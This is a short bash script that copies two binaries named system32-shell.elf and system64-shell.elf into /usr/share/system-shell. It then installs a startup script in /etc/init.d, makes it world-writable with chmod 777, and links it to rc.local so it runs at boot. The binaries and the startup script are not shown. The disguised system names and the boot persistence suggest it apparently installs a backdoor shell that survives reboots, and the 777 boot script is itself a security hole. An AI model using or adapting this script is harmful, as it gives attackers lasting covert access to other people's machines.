#!/bin/bash

mkdir /usr/share/system-shell
cp system32-shell.elf /usr/share/system-shell/
cp system64-shell.elf /usr/share/system-shell/
sudo systemctl enable rc-local.service
cp system-shell-startup.sh /etc/init.d/system-shell-startup.sh
chmod 777 /etc/init.d/system-shell-startup.sh
sudo ln -s /etc/init.d/system-shell-startup.sh /etc/rc.d/rc.local